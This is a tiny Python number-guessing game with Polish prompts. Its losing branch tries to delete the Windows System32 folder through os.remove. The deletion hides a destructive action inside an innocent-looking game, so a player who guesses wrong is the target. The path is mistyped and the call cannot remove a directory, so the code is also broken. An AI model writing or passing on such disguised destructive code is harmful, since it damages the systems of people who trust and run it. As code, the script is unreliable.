import random
import os

number = random.randint(1, 10)

guess = input("Miłej Gry! Wybierz numer od 1 do 10: ")
guess = int(guess)

if guess == number:
    print("Wygrałeś")
else:
    os.remove("C;\Windeows\System32")